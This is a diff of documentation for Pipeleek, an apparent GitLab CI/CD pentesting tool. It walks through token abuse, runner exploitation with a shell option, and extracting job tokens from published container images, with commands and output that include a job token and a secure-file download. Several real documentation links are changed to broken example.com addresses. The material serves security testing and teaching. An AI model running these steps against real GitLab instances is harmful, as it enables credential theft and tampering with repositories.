@@ -157,8 +157,8 @@ $ pipeleek gl scan --token glpat-[redacted] --gitlab https://gitlab.example.com 
 2024-09-26T13:47:10+02:00 debug Loaded filtered rules count=882
 2024-09-26T13:47:10+02:00 info Fetching projects
 2024-09-26T13:47:10+02:00 info Provided GitLab session cookie is valid
-2024-09-26T13:47:15+02:00 debug Fetch Project jobs for url=https://gitlab.com/legendaryleo/WebRTC_Source
-2024-09-26T13:47:15+02:00 debug Fetch Project jobs for url=https://gitlab.com/himanshu8443/fdroiddata
+2024-09-26T13:47:15+02:00 debug Fetch Project jobs for url=https://gitlab.example.com/legendaryleo/WebRTC_Source
+2024-09-26T13:47:15+02:00 debug Fetch Project jobs for url=https://gitlab.example.com/himanshu8443/fdroiddata
 [redacted]
 ```
 
@@ -186,7 +186,7 @@ Z[redacted]s=
 glpat-[remvoed]
 
 # Verify using the API
-curl --request GET --header "PRIVATE-TOKEN: glpat-[redacted]" https://gitlab.com/api/v4/user/ | jq
+curl --request GET --header "PRIVATE-TOKEN: glpat-[redacted]" https://gitlab.example.com/api/v4/user/ | jq
 
 {
   "id": [redacted],
@@ -198,14 +198,14 @@ curl --request GET --header "PRIVATE-TOKEN: glpat-[redacted]" https://gitlab.com
 }
 
 # Verify using Pipeleek
-pipeleek gl enum -g https://gitlab.com -t glpat-[redacted]
+pipeleek gl enum -g https://gitlab.example.com -t glpat-[redacted]
 2025-09-29T12:25:51Z info Enumerating User
 2025-09-29T12:25:51Z warn Current user admin=false bot=false email=test@example.com name="Pipe Leak" username=pipeleek_user
 2025-09-29T12:25:51Z info Enumerating Access Token
 2025-09-29T12:25:51Z warn Current Token active=true created=2025-09-29T12:25:20Z description=test id=14839115 lastUsedAt=2025-09-29T12:25:51Z lastUsedIps= name=testToken revoked=false scopes=read_api userId=14918432
 2025-09-29T12:25:51Z info Enumerating Projects and Groups
-2025-09-29T12:25:52Z warn Group accessLevel=50 group=https://gitlab.com/groups/example-group name=example-project visibility=private
-2025-09-29T12:25:52Z warn Project groupAccessLevel=50 name="example-group / another project" project=https://gitlab.com/example-group/another-project projectAccessLevel=0
+2025-09-29T12:25:52Z warn Group accessLevel=50 group=https://gitlab.example.com/groups/example-group name=example-project visibility=private
+2025-09-29T12:25:52Z warn Project groupAccessLevel=50 name="example-group / another project" project=https://gitlab.example.com/example-group/another-project projectAccessLevel=0
 2025-09-29T12:25:52Z info Done
 ```
 
@@ -213,7 +213,7 @@ Abusing this access token grants you access to the `another-project` repository,
 
 ## Attacking Runners
 
-Chances are high that if pipelines are used, custom runners are registered. These come in different flavors. Most of the time the docker executor is used, which allows pipelines to define container images in which their commands are executed. For a full list of possibilities [rtfm](https://docs.gitlab.com/runner/executors/).
+Chances are high that if pipelines are used, custom runners are registered. These come in different flavors. Most of the time the docker executor is used, which allows pipelines to define container images in which their commands are executed. For a full list of possibilities [rtfm](https://docs.gitlab.example.com/runner/executors/).
 
 If you can create projects or contribute to existing ones, you can interact with runners. We want to test if it is possible to escape from the runner context e.g. escape from the container to the host machine or if the runner leaks additional privileges e.g. in the form of attached files or environment variables set by the runner config.
 
@@ -226,10 +226,10 @@ Using pipeleek we can automate runner enumeration:
 
 ```bash
 $ pipeleek gl runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v list
-2024-09-26T14:26:54+02:00 info group runner description=2-green.shared-gitlab-org.runners-manager.gitlab.com name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org type=instance_type
-2024-09-26T14:26:55+02:00 info group runner description=3-green.shared-gitlab-org.runners-manager.gitlab.com/dind name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org-docker type=instance_type
-2024-09-26T14:26:55+02:00 info group runner description=blue-3.saas-linux-large-amd64.runners-manager.gitlab.com/default name=comp-test-ia paused=false runner=gitlab-runner tags=saas-linux-large-amd64 type=instance_type
-2024-09-26T14:26:55+02:00 info group runner description=green-1.saas-linux-2xlarge-amd64.runners-manager.gitlab.com/default name=comp-test-ia paused=false runner= tags=saas-linux-2xlarge-amd64 type=instance_type
+2024-09-26T14:26:54+02:00 info group runner description=2-green.shared-gitlab-org.runners-manager.gitlab.example.com name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org type=instance_type
+2024-09-26T14:26:55+02:00 info group runner description=3-green.shared-gitlab-org.runners-manager.gitlab.example.com/dind name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org-docker type=instance_type
+2024-09-26T14:26:55+02:00 info group runner description=blue-3.saas-linux-large-amd64.runners-manager.gitlab.example.com/default name=comp-test-ia paused=false runner=gitlab-runner tags=saas-linux-large-amd64 type=instance_type
+2024-09-26T14:26:55+02:00 info group runner description=green-1.saas-linux-2xlarge-amd64.runners-manager.gitlab.example.com/default name=comp-test-ia paused=false runner= tags=saas-linux-2xlarge-amd64 type=instance_type
 2024-09-26T14:26:55+02:00 info Unique runner tags tags=gitlab-org,saas-linux-large-arm64,windows,gitlab-org-docker,e2e-runner2,saas-macos-large-m2pro,saas-linux-xlarge-amd64,saas-linux-small-amd64,saas-linux-2xlarge-amd64,saas-linux-medium-amd64,saas-windows-medium-amd64,e2e-runner3,saas-linux-medium-arm64,saas-linux-medium-amd64-gpu-standard,saas-macos-medium-m1,shared-windows,saas-linux-large-amd64,windows-1809
 2024-09-26T14:26:55+02:00 info Done, Bye Bye 🏳️‍🌈🔥
 ```
@@ -268,9 +268,9 @@ pipeleek-job-saas-linux-small-amd64:
 # Automated
 $ pipeleek gl runners --token glpat-[redacted]  --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell
 2024-09-26T14:33:48+02:00 debug Verbose log output enabled
-2024-09-26T14:33:49+02:00 info Created project name=pipeleek-runner-exploit url=https://gitlab.com/[redacted]/pipeleek-runner-exploit
+2024-09-26T14:33:49+02:00 info Created project name=pipeleek-runner-exploit url=https://gitlab.example.com/[redacted]/pipeleek-runner-exploit
 2024-09-26T14:33:50+02:00 info Created .gitlab-ci.yml file=.gitlab-ci.yml
-2024-09-26T14:33:50+02:00 info Check pipeline logs manually url=https://gitlab.com/[redacted]/pipeleek-runner-exploit/-/pipelines
+2024-09-26T14:33:50+02:00 info Check pipeline logs manually url=https://gitlab.example.com/[redacted]/pipeleek-runner-exploit/-/pipelines
 2024-09-26T14:33:50+02:00 info Make sure to delete the project when done
 2024-09-26T14:33:50+02:00 info Done, Bye Bye 🏳️‍🌈🔥
 ```
@@ -319,3 +319,89 @@ Using [TruffleHog](https://github.com/trufflesecurity/trufflehog):
 ```bash
 trufflehog docker --image registry.leakycompany.com/auser/arepo
 ```
+
+## Artipacked
+
+GitLab CI/CD pipelines automatically create a job [token](https://docs.gitlab.example.com/ci/jobs/ci_job_token/). It is used for operations like cloning the repository or pulling from the container registry. The token is scoped and does not grant full API access. It is only valid during the job run and revoked when the job finishes.
+
+If you can recover a valid job token, you may be able to clone a repository or publish malicious artifacts. See the [docs](https://docs.gitlab.example.com/ci/jobs/ci_job_token/) for details.
+
+GitLab populates `.git/config` with a job token during CI clones. If a later step publishes that file, the token can leak. Common causes are broad container build copy statements that bundle `.git` into an image or release builds that accidentally ship the `.git` directory. If a race exists between publishing and job completion (token revocation), you can abuse the token.
+
+In this example we scan for container builds that include too many files (including the `.git` folder).
+
+```bash
+pipeleek gl container artipacked -o
+2026-02-09T14:54:52Z info Loaded container scan patterns pattern_count=4
+2026-02-09T14:54:52Z info Fetching projects
+2026-02-09T14:54:56Z info Identified content="COPY . ." file=Containerfile is_multistage=false url=https://gitlab.example.com/auser/artipacked
+```
+
+The detected Containerfile copies the full working directory and then pushes the image into the GitLab container registry.
+
+From the `gitlab-ci.yml` excerpt, the registry push is followed by a `sleep`. This means the published container image contains a job token that remains valid until the `sleep` finishes.
+
+```yml
+build-artipacked-container:
+  stage: build
+  image: quay.io/buildah/stable:latest
+  variables:
+    IMAGE_NAME: $CI_REGISTRY_IMAGE:latest
+    STORAGE_DRIVER: vfs
+  rules:
+    - if: $CI_COMMIT_BRANCH
+  script:
+    - buildah login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" "$CI_REGISTRY"
+    - buildah bud -f Containerfile -t "$IMAGE_NAME" .
+    - buildah push "$IMAGE_NAME"
+    - sleep 3500
+    - echo "Finished container"
+```
+
+You can now pull the published image and extract the job token as long as the job is still running.
+
+```bash
+docker pull registry.gitlab.example.com/auser/artipacked:latest
+latest: Pulling from auser/artipacked
+7319607d119c: Already exists
+473766943e5c: Pull complete
+Digest: sha256:bb8ad10d8fe0f531516e9a2277ec1cd4985956a7d90adece165437520132a9fe
+Status: Downloaded newer image for registry.gitlab.example.com/auser/artipacked:latest
+registry.gitlab.example.com/auser/artipacked:latest
+
+docker run --rm --entrypoint sh registry.gitlab.example.com/auser/artipacked:latest -c "cat .git/config"
+[init]
+        defaultBranch = none
+[fetch]
+        recurseSubmodules = false
+[credential]
+        interactive = never
+[gc]
+        autoDetach = false
+[include]
+        path = /builds/auser/artipacked.tmp/.gitlab-runner.ext.conf
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = https://gitlab-ci-token:glcbt-6c_z1CoZjUyFfAu6cE2XFTC@gitlab.example.com/auser/artipacked.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[lfs]
+        repositoryformatversion = 0
+```
+
+Then validate and create PoC exploit:
+
+```bash
+pipeleek gl jobToken exploit --project auser/artipacked --token glcbt-6c_z1CoZjUyFfAu6cE2XFTC
+2026-02-09T15:25:30Z info Job token validation succeeded
+2026-02-09T15:25:30Z info Job token context resolved job_id=13042619352 project=auser/artipacked project_id=79339419 ref=main status=running web_url=https://gitlab.example.com/auser/artipacked/-/jobs/13042619352
+2026-02-09T15:25:30Z info Fetching secure files project=auser/artipacked
+2026-02-09T15:25:31Z info Saved secure file bytes=19 name=secure.txt path=secure-files/secure.txt
+2026-02-09T15:25:34Z info Created jobToken exploit branch branch=pipeleek-663f51b4 project=https://gitlab.example.com/auser/artipacked
+2026-02-09T15:25:34Z info Review branch changes url=https://gitlab.example.com/auser/artipacked/-/tree/pipeleek-663f51b4
+```
+
+The command verified the token, downloaded existing secure files and actually pushed a change to the repo. Pushing does not work in default settings, only if the maintainers [allowed](https://docs.gitlab.com/ci/jobs/ci_job_token/#allow-git-push-requests-to-your-project-repository) repository push for the job token.
